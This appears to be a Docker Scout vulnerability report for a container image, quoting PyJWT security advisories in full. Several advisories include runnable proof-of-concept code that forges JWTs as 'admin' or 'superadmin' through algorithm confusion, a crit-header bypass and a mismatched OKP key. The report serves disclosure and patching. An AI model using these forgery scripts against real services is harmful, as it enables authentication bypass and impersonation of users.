<h2>:mag: Vulnerabilities of <code>libreriaonuba-api:latest</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>libreriaonuba-api:latest</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:64df6b6b989bcf7b64cc6015aa2daf5293e8a6f702d48e9d3b7aba3797ca3a66</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 1" src="https://img.shields.io/badge/critical-1-8b1924"/> <img alt="high: 15" src="https://img.shields.io/badge/high-15-e25d68"/> <img alt="medium: 21" src="https://img.shields.io/badge/medium-21-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/low-3-fce1a9"/> <!-- unspecified: 0 --></td></tr>
<tr><td>platform</td><td>linux/arm64</td></tr>
<tr><td>size</td><td>66 MB</td></tr>
<tr><td>packages</td><td>115</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 5" src="https://img.shields.io/badge/H-5-e25d68"/> <img alt="medium: 6" src="https://img.shields.io/badge/M-6-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>pyjwt</strong> <code>2.6.0</code> (pypi)</summary>

<small><code>pkg:pypi/pyjwt@2.6.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-102268?s=github&n=pyjwt&t=pypi&vr=%3C%3D2.13.0"><img alt="critical 9.1: CVE--2026--102268" src="https://img.shields.io/badge/CVE--2026--102268-lightgrey?label=critical%209.1&labelColor=8b1924"/></a> <i>Improper Verification of Cryptographic Signature</i>

<table>
<tr><td>Affected range</td><td><code><=2.13.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.196%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**Prerequisites** (both conditions must hold; both are deployment properties, not attacker-controlled at request time):

- The `jwt.decode` allow-list mixes an HMAC algorithm with an asymmetric one, e.g. `algorithms=["ES256", "HS256"]` (the RFC 8725 footgun the guard exists to backstop).
- The verification key is passed as raw PEM text/bytes on the non-`PyJWK` path, in a byte-form that `cryptography`'s loader accepts but PyJWT's `is_pem_format` regex does not recognize (marker-adjacent whitespace/indentation, CR-only line terminators, or the PEM folded to a single line). Such forms arise naturally from an indented YAML/JSON block, a single-line environment variable or JSON string, or a CR/LF round-trip through config tooling.

The attacker additionally needs the public verification key, which is public by definition, and `cryptography` must be installed.

The fix for CVE-2022-29217 rejects an asymmetric key handed to an HMAC algorithm, but only when `is_pem_format()` recognizes the key as PEM. That recognizer accepts strictly fewer byte-forms than the loader that later parses the key, so a PEM the guard misses still loads as a valid public key and is then used as an HMAC secret. This is an incomplete-guard bypass of the CVE-2022-29217 family.

### Summary
A PEM public key with marker-adjacent whitespace, CR-only line terminators, or folded to a single line makes PyJWT's `is_pem_format()` return `False` while `cryptography.load_pem_public_key()` accepts the identical bytes. The asymmetric-key rejection in `HMACAlgorithm.prepare_key` is skipped, the public key becomes the HMAC secret, and an attacker who knows the public key mints a valid `HS256` token — universal forgery — whenever the verify allow-list mixes an HMAC and an asymmetric algorithm.

### Details
At `jwt/algorithms.py:331-335`, `HMACAlgorithm.prepare_key` contains the sole family-mismatch guard:

    if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
        raise InvalidKeyError(
            "The specified key is an asymmetric key or x509 certificate and"
            " should not be used as an HMAC secret."
        )

If neither predicate fires, `:357` returns `key_bytes` unchanged — the PEM text is used directly as the HMAC secret.

`is_pem_format` (`jwt/utils.py:116-127`) is `bool(_PEM_RE.search(key))`, where `_PEM_RE` requires `----[- ]BEGIN (...)[- ]----\r?\n`, then `.+?\r?\n`, then the END marker. The LF in each `\r?\n` is mandatory, the markers are anchored directly after a newline, and only `[- ]` is tolerated adjacent to them — not arbitrary whitespace. So a key with a tab/space before the END marker, with bare `\r` terminators, or folded onto one line is not recognized as PEM. `cryptography`'s `load_pem_public_key` is tolerant of exactly these forms and still returns the key.

Reach: `jwt/api_jws.py:386` performs the allow-list check (passes when `HS256` is in the list) and takes the non-`PyJWK` branch to `alg_obj.prepare_key(key)` at `:407`. The mismatch guard above is the only thing standing between a mixed allow-list and using the public key as an HMAC secret.

### PoC
Vulnerable path: `jwt/algorithms.py:331` (guard gated on `is_pem_format`) -> `is_pem_format` returns `False` for a loader-accepted PEM -> `jwt/algorithms.py:357` returns the public-key bytes as the HMAC secret -> `HS256` verification succeeds.

Reproduced on PyJWT 2.13.0 (commit `7144e453`) with `cryptography` 49.0.0, using only the public API. For each of an EC (ES256) and an RSA-2048 (RS256) key: start from the correct public-key PEM, apply a mutation, confirm `is_pem_format` now returns `False` while `cryptography` still loads the bytes, then verify a token signed `alg=HS256` with the public-key text as the HMAC secret, under `algorithms=["ES256","HS256"]` (resp. `["RS256","HS256"]`).

Observed output:

    pyjwt 2.13.0
      ec  canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError
      ec  marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)
      ec  CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)
      ec  folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)
      rsa canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError
      rsa marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)
      rsa CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)
      rsa folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)
      [control B] single-alg [ES256] allow-list vs forged HS256: REJECTED:InvalidAlgorithmError
    RESULT: ALL-INVARIANTS-HOLD

Each mutated form on both key types forged a token accepted as `superadmin`. Controls: the unmodified PEM is correctly rejected with `InvalidKeyError` (the guard works and the mutation is load-bearing); a single-algorithm allow-list `["ES256"]` rejects the forged `HS256` token with `InvalidAlgorithmError` (the mixed allow-list is a necessary precondition).

Steps to reproduce:
1. Generate an EC P-256 (or RSA-2048) keypair; serialize the public key to PEM.
2. Mutate the PEM into a loader-accepted, regex-missed form — e.g. insert a tab before `-----END`, convert terminators to bare `\r`, or join all lines into one.
3. Confirm `jwt.utils.is_pem_format(mutated) is False` and `cryptography.hazmat.primitives.serialization.load_pem_public_key(mutated)` succeeds.
4. `jwt.encode({"sub":"superadmin"}, mutated, algorithm="HS256")`, then `jwt.decode(token, mutated, algorithms=["ES256","HS256"])` — verification succeeds.

### Impact
Cryptographic signature-verification bypass (CWE-347): algorithm confusion re-enabled by an incomplete asymmetric-key guard. An attacker who knows only the public verification key forges arbitrary-claim tokens that verify as authentic, subject to the two deployment preconditions above. The `PyJWK` verification path binds a single algorithm and is unaffected; `enforce_minimum_key_length` (off by default) does not block a 2048-bit/P-256 PEM. Impact when the preconditions hold is critical (universal forgery); the compound precondition is realistic but was not observed in a specific real-world deployment, so this is rated Critical, with the deployment precondition captured in CVSS.

## Maintainer update — 2026-09-10

We reproduced the reported asymmetric-key guard bypass on PyJWT 2.13.0: PEM public keys with loader-accepted formatting mutations were missed by `is_pem_format`, then accepted as HMAC secrets when a verification call mixed symmetric and asymmetric algorithms. Canonical PEM controls remained blocked, and a single-algorithm allow-list rejected the forged HS256 token.

The fix is committed as `8b4e233a22206b34ec1186e912e75c0b2396ac07`. PyJWT now scans supported PEM BEGIN/END markers in one pass, preserving matching labels and handling overlapping markers without regex backtracking. Regression coverage includes RSA loader-accepted mutations, incomplete repeated markers, later valid PEM blocks, and overlapping END/BEGIN markers. The fix does not broaden DER-key classification or change the caller's algorithm allow-list policy.

Verification on the signed commit passes with 400 tests and 4 intentional cryptography-environment skips; Ruff formatting/lint and the Python 3.9 mypy tox target pass. Fresh Astra/max independent review accepted the final snapshot and confirmed O(n) scanning, bounded storage, and no blocking compatibility or security finding. The fix has not been released; the advisory remains Critical with CVSS 3.1 score 9.1 and CWE-347.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32597?s=github&n=pyjwt&t=pypi&vr=%3C%3D2.11.0"><img alt="high 7.5: CVE--2026--32597" src="https://img.shields.io/badge/CVE--2026--32597-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Insufficient Verification of Data Authenticity</i>

<table>
<tr><td>Affected range</td><td><code><=2.11.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.12.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.282%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

PyJWT does not validate the `crit` (Critical) Header Parameter defined in
RFC 7515 §4.1.11. When a JWS token contains a `crit` array listing
extensions that PyJWT does not understand, the library accepts the token
instead of rejecting it. This violates the **MUST** requirement in the RFC.

This is the same class of vulnerability as CVE-2025-59420 (Authlib),
which received CVSS 7.5 (HIGH).

---

## RFC Requirement

RFC 7515 §4.1.11:

> The "crit" (Critical) Header Parameter indicates that extensions to this
> specification and/or [JWA] are being used that **MUST** be understood and
> processed. [...] If any of the listed extension Header Parameters are
> **not understood and supported** by the recipient, then the **JWS is invalid**.

---

## Proof of Concept

```python
import jwt  # PyJWT 2.8.0
import hmac, hashlib, base64, json

# Construct token with unknown critical extension
header = {"alg": "HS256", "crit": ["x-custom-policy"], "x-custom-policy": "require-mfa"}
payload = {"sub": "attacker", "role": "admin"}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(b"secret", f"{h}.{p}".encode(), hashlib.sha256).digest())
token = f"{h}.{p}.{sig}"

# Should REJECT — x-custom-policy is not understood by PyJWT
try:
    result = jwt.decode(token, "secret", algorithms=["HS256"])
    print(f"ACCEPTED: {result}")
    # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'}
except Exception as e:
    print(f"REJECTED: {e}")
```

**Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy`
**Actual:** Token accepted, payload returned.

### Comparison with RFC-compliant library

```python
# jwcrypto — correctly rejects
from jwcrypto import jwt as jw_jwt, jwk
key = jwk.JWK(kty="oct", k=b64url(b"secret"))
jw_jwt.JWT(jwt=token, key=key, algs=["HS256"])
# raises: InvalidJWSObject('Unknown critical header: "x-custom-policy"')
```

---

## Impact

- **Split-brain verification** in mixed-library deployments (e.g., API
  gateway using jwcrypto rejects, backend using PyJWT accepts)
- **Security policy bypass** when `crit` carries enforcement semantics
  (MFA, token binding, scope restrictions)
- **Token binding bypass** — RFC 7800 `cnf` (Proof-of-Possession) can be
  silently ignored
- See CVE-2025-59420 for full impact analysis

---

## Suggested Fix

In `jwt/api_jwt.py`, add validation in `_validate_headers()` or
`decode()`:

```python
_SUPPORTED_CRIT = {"b64"}  # Add extensions PyJWT actually supports

def _validate_crit(self, headers: dict) -> None:
    crit = headers.get("crit")
    if crit is None:
        return
    if not isinstance(crit, list) or len(crit) == 0:
        raise InvalidTokenError("crit must be a non-empty array")
    for ext in crit:
        if ext not in self._SUPPORTED_CRIT:
            raise InvalidTokenError(f"Unsupported critical extension: {ext}")
        if ext not in headers:
            raise InvalidTokenError(f"Critical extension {ext} not in header")
```

---

## CWE

- CWE-345: Insufficient Verification of Data Authenticity
- CWE-863: Incorrect Authorization

## References

- [RFC 7515 §4.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11)
- [CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32)
- [RFC 7800 — Proof-of-Possession Key Semantics](https://www.rfc-editor.org/rfc/rfc7800)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48526?s=github&n=pyjwt&t=pypi&vr=%3C2.13.0"><img alt="high 7.4: CVE--2026--48526" src="https://img.shields.io/badge/CVE--2026--48526-lightgrey?label=high%207.4&labelColor=e25d68"/></a> <i>Improper Authentication</i>

<table>
<tr><td>Affected range</td><td><code><2.13.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.13.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.427%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

> [!NOTE]
> Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in `algorithms=[…]` and a raw-JSON JWK as the `key=` argument, both contrary to documented usage, hence the High attack-complexity rating.

### Summary
When the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.   

### Details
In JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms.
In pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:
  
`jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) `

An attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm. 
The attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user. 

If we look on current protections implemented in the library, at class HMACAlgorithm:

```
  def prepare_key(self, key: str | bytes) -> bytes:
        key_bytes = force_bytes(key)

        if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
            raise InvalidKeyError(
                "The specified key is an asymmetric key or x509 certificate and"
                " should not be used as an HMAC secret."
            )

        return key_bytes
```
We can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.

In The following example:
`jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) `
There is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations. 

The bypass happens only if the verifier:
 (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.

### PoC
Please run the code and observe the payload printed in clear text({"sub":"alice","admin":true}')

```
from jwt.api_jws import PyJWS
import json, base64, hmac, hashlib

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

# Public RSA JWK (public by design)
rsa_jwk_json = json.dumps({"kty":"RSA","n":"AQAB","e":"AQAB"})

# Attacker-crafted token: flip to HS256 and choose claims
header  = b64u(b'{"alg":"HS256","typ":"JWT"}')
payload = b64u(b'{"sub":"alice","admin":true}')
signing = header + b"." + payload

# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”
sig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()
token = (signing + b"." + b64u(sig)).decode()

# Vulnerable verifier: mixed families + JWK JSON string as key
jws = PyJWS()
print(jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"]))
# -> b'{"sub":"alice","admin":true}'
```


### Impact
Unauthenticated token forgery → full identity/role impersonation at the resource server (authorization bypass).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102271?s=github&n=pyjwt&t=pypi&vr=%3E%3D2.4.0%2C%3C2.14.0"><img alt="high 7.4: CVE--2026--102271" src="https://img.shields.io/badge/CVE--2026--102271-lightgrey?label=high%207.4&labelColor=e25d68"/></a> <i>Improper Verification of Cryptographic Signature</i>

<table>
<tr><td>Affected range</td><td><code>>=2.4.0<br/><2.14.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.175%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`HMACAlgorithm.prepare_key` blocks asymmetric keys from being used as HMAC secrets by searching for text markers only. It looks for `-----BEGIN` and for an `ssh-` prefix. The same key in DER form is binary ASN.1 and has neither marker, so it passes the check and is used as an HMAC secret.

An application that verifies tokens with an RSA or EC public key, and also allows HS256 with that same key, can be given a forged token. The attacker signs it with the public key, which is public. This is the key confusion problem CVE-2022-29217 was filed for, reachable again through a different encoding.

The reach is smaller than the original CVE. The application must already be in that misconfiguration, and it must hold its public key as DER bytes rather than PEM.

### Details

The guard is at `jwt/algorithms.py:331`:

```python
if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
    raise InvalidKeyError(
        "The specified key is an asymmetric key or x509 certificate and"
        " should not be used as an HMAC secret."
    )
```

Both helpers are text matchers. Neither one parses the key.

- `jwt/utils.py:126`, `is_pem_format`, runs a regex for `----[- ]BEGIN ...----`.
- `jwt/utils.py:141`, `is_ssh_key`, checks `startswith` against a list of `ssh-` and `ecdsa-sha2-` prefixes.

A DER encoded public key starts with the bytes `0x30 0x82`. It matches neither, so `prepare_key` returns it unchanged and it becomes the HMAC secret.

There is no DER handling anywhere in the package. `grep -rni "\bDER\b|load_der" jwt/ tests/` returns nothing.

This affects three encodings that are all blocked in their PEM form today:

- DER SubjectPublicKeyInfo
- DER PKCS#1
- DER encoded X.509 certificate

History of this guard:

- Added in 2.4.0 for CVE-2022-29217 and GHSA-ffqj-6fqr-9h24, covering PEM and SSH.
- Extended in 2.13.0 for GHSA-xgmm-8j9v-c9wx, covering JWK JSON documents.
- DER has never been covered.

Applications that use `PyJWK` or `PyJWKClient` are not affected. `jwt/api_jws.py:395` binds the header `alg` to the key's own algorithm, so HS256 never reaches `HMACAlgorithm.prepare_key` on that path.

Suggested fix: try to parse the bytes as a key and reject if parsing works. For example `load_der_public_key`, `load_der_private_key` and `load_der_x509_certificate` in a try/except chain, next to the checks already there. A random HMAC secret will not parse as valid DER, so real secrets should not be rejected.

### PoC

Tested on 2.4.0, on 2.13.0, and on main at commit `7144e4534`. All three behave the same. The guard has been marker based since 2.4.0, so the versions in between are very likely affected as well.

```console
pip install "pyjwt==2.13.0" cryptography
python poc.py
```

No special configuration is needed. The script builds its own key.

```python
import base64
import hashlib
import hmac
import json

import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

pub = rsa.generate_private_key(public_exponent=65537, key_size=2048).public_key()
pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
der = pub.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
der_pkcs1 = pub.public_bytes(Encoding.DER, PublicFormat.PKCS1)


def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def forge(secret):
    # The attacker does not use PyJWT. They only need the public key bytes.
    head = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = b64(json.dumps({"user": "admin", "role": "admin"}).encode())
    signing_input = head + b"." + body
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64(sig)).decode()


# PEM form is rejected, as expected since CVE-2022-29217.
try:
    jwt.decode(forge(pem), pem, algorithms=["RS256", "HS256"])
except jwt.exceptions.InvalidKeyError as exc:
    print("PEM rejected:", exc)

# Same key, DER form. The forged token verifies.
print("DER SPKI accepted:", jwt.decode(forge(der), der, algorithms=["RS256", "HS256"]))
print("DER PKCS#1 accepted:", jwt.decode(forge(der_pkcs1), der_pkcs1, algorithms=["RS256", "HS256"]))
```

Output:

```
PEM rejected: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC s
DER SPKI accepted: {'user': 'admin', 'role': 'admin'}
DER PKCS#1 accepted: {'user': 'admin', 'role': 'admin'}
```

The token is signed with plain `hmac`, so this exercises the verify path only. The PEM and the DER values come from the same key object, so the encoding is the only thing that changes.

We also have a regression test written in your pytest style. It uses your own `tests/keys` fixtures, covers the DER certificate case too, and fails on current main. Glad to send it or open a PR.

### Impact

Key confusion, CWE-347, improper verification of a cryptographic signature. Same class as CVE-2022-29217.

Who is affected: applications that verify tokens with an asymmetric public key, also list an HS\* algorithm  pass that public key to `jwt.decode` as DER bytes.

What an attacker gets: they can mint tokens with any claims they want, so they can log in as any user. They  is public, and they re-encode it to DER. Nothing secret has to be stolen first.

What limits it: the application must already be in the mixed HS\* and RS\* misconfiguration. It must also hoEM is the more common form and is still blocked. Users of `PyJWK` and `PyJWKClient` are not affected.


> Maintainer update (2026-09-10): We reproduced the issue for DER SubjectPublicKeyInfo, RSA PKCS#1 public-key DER, and DER X.509 certificate inputs when a caller mixes HS* and an asymmetric algorithm and passes the public material as raw bytes. The fix is on master in commit 2798504fa2663364573cf2d1043d8d7fef389499; HMACAlgorithm.prepare_key now rejects DER public keys and certificates when cryptography is available, while arbitrary binary HMAC secrets remain accepted. Verification included the DER regression/control tests, full python -m tox (available environments passed; unavailable interpreters were skipped), Ruff, mypy, packaging, and coverage. The fix has not yet shipped in a release, so this advisory is being moved from triage to draft and will remain unpublished until a supported 2.x release contains the fix. Private-key container formats are outside this fix scope.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102267?s=github&n=pyjwt&t=pypi&vr=%3C%3D2.13.0"><img alt="high 7.4: CVE--2026--102267" src="https://img.shields.io/badge/CVE--2026--102267-lightgrey?label=high%207.4&labelColor=e25d68"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><=2.13.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.157%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

PyJWT 2.13.0 `PyJWKClient` followed HTTP redirects while fetching a JWKS,
without validating the redirect destination. A configured trusted endpoint
could therefore redirect the client to a different host.

### Impact

When an application uses `PyJWKClient` with caller-supplied request headers and
an attacker can influence the configured endpoint's response, the redirected
request could expose those headers and the redirected response could be used as
authoritative key material. This could cause JWKS trust poisoning and, in
affected mixed-configuration applications, forged JWT acceptance. The issue
requires an attacker-influenced redirect from the configured JWKS endpoint; it
is not triggered by a token `kid` alone.

### Affected versions

PyJWT `<= 2.13.0`.

### Fix

The issue is fixed on `master` in commit
[`0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56`](https://github.com/jpadilla/pyjwt/commit/0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56).
`PyJWKClient` now disables automatic redirects for JWKS fetches. Regression
tests verify that a redirect is rejected without contacting its destination,
while normal fetches, headers, caching, errors, timeouts, and SSL context remain
covered.

The fix is present in the unreleased development branch. The patched version
will be recorded after a released PyJWT 2.x version containing the fix is
confirmed.

### Credit

Credit: the original reporter of GHSA-9v7f-9g4p-ffgj. Additional redirect
header-leak and cache-poisoning evidence from the newer duplicate report
GHSA-43g3-98cx-x446 is preserved in the duplicate record and informed this
canonical advisory update.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-45768?s=pypa&n=pyjwt&t=pypi&vr=%3C%3D2.10.1"><img alt="high 7.0: CVE--2025--45768" src="https://img.shields.io/badge/CVE--2025--45768-lightgrey?label=high%207.0&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.10.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.168%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pyjwt v2.10.1 was discovered to contain weak encryption. NOTE: this is disputed by the Supplier because the key length is chosen by the application that uses the library (admittedly, library users may benefit from a minimum value and a mechanism for opting in to strict enforcement).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102275?s=github&n=pyjwt&t=pypi&vr=%3E%3D2.1.0%2C%3C%3D2.14.0"><img alt="medium 6.5: CVE--2026--102275" src="https://img.shields.io/badge/CVE--2026--102275-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Insufficient Verification of Data Authenticity</i>

<table>
<tr><td>Affected range</td><td><code>>=2.1.0<br/><=2.14.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.15.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.137%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

PyJWT accepts internally inconsistent OKP private JWKs where the declared public key `x` does not correspond to the supplied private key `d`.

When `d` is present, `OKPAlgorithm.from_jwk()` constructs the Ed25519/Ed448 private key from `d` without verifying that the public key derived from `d` matches `x`. As a result, the original JWK can contain one public key identity while PyJWT performs cryptographic operations using a different key.

In affected DPoP integrations, this can allow a stolen sender-constrained access token to be used without possession of the legitimate holder's private key.

### Details

The vulnerable logic is in `jwt/algorithms.py`:

```python
if "x" not in obj:
    raise InvalidKeyError('OKP should have "x" parameter')

x = base64url_decode(obj.get("x"))

if "d" not in obj:
    if curve == "Ed25519":
        return Ed25519PublicKey.from_public_bytes(x)
    return Ed448PublicKey.from_public_bytes(x)

d = base64url_decode(obj.get("d"))

if curve == "Ed25519":
    return Ed25519PrivateKey.from_private_bytes(d)

return Ed448PrivateKey.from_private_bytes(d)
```

When `d` is present, `x` is parsed but never compared with the public key derived from `d`.

For example, PyJWT accepts:

```json
{
  "kty": "OKP",
  "crv": "Ed25519",
  "x": "<legitimate-user-public-key>",
  "d": "<attacker-private-key>"
}
```

even though `x` and `d` belong to different key pairs.

The behavior has existed since OKP private-JWK import was introduced:

* Ed25519: PyJWT 2.1.0+
* Ed448: PyJWT 2.2.0+
* Confirmed through PyJWT 2.14.0 and current master

A correct import should derive the public key from `d` and reject the JWK when it does not equal the supplied `x`.

### PoC

The reproducer creates two Ed25519 keypairs:

* a legitimate holder keypair
* an attacker keypair

It then:

1. Creates an access token whose `cnf.jkt` is bound to the legitimate public key.
2. Creates a DPoP proof JWK containing the legitimate user's `x` together with the attacker's `d`.
3. Computes the RFC 7638 thumbprint from `x`, which still matches the access-token binding.
4. Passes the complete JWK to `PyJWK.from_dict()`.
5. PyJWT imports the private key from the attacker-controlled `d`.
6. A DPoP proof signed with the attacker's private key verifies successfully.

Observed result:

```text
thumbprint_matches: true
actual_key_is_attacker_key: true
actual_key_matches_declared_x: false
stolen_sender_constrained_token_accepted: true
attacker_has_legitimate_private_key: false
```

Tested on PyJWT 2.13.0, PyJWT 2.14.0, and current master.

The complete reproducer is:
```python
#!/usr/bin/env python3


from __future__ import annotations

import base64
import hashlib
import json
import os
import platform
import time
from importlib.metadata import version
from typing import Any

import jwt
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryption,
    PrivateFormat,
    PublicFormat,
)


ACCESS_TOKEN_SECRET = b"synthetic-authorization-server-key-32b"
HTTP_METHOD = "GET"
HTTP_URI = "https://resource.example/protected"


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def public_x(private_key: Ed25519PrivateKey) -> str:
    return b64url(private_key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw))


def private_d(private_key: Ed25519PrivateKey) -> str:
    return b64url(
        private_key.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption())
    )


def jwk_thumbprint(jwk: dict[str, Any]) -> str:
    canonical = json.dumps(
        {"crv": jwk["crv"], "kty": jwk["kty"], "x": jwk["x"]},
        separators=(",", ":"),
        sort_keys=True,
    ).encode("ascii")
    return b64url(hashlib.sha256(canonical).digest())


def access_token_hash(access_token: str) -> str:
    return b64url(hashlib.sha256(access_token.encode("ascii")).digest())


def verify_resource_request(
    access_token: str,
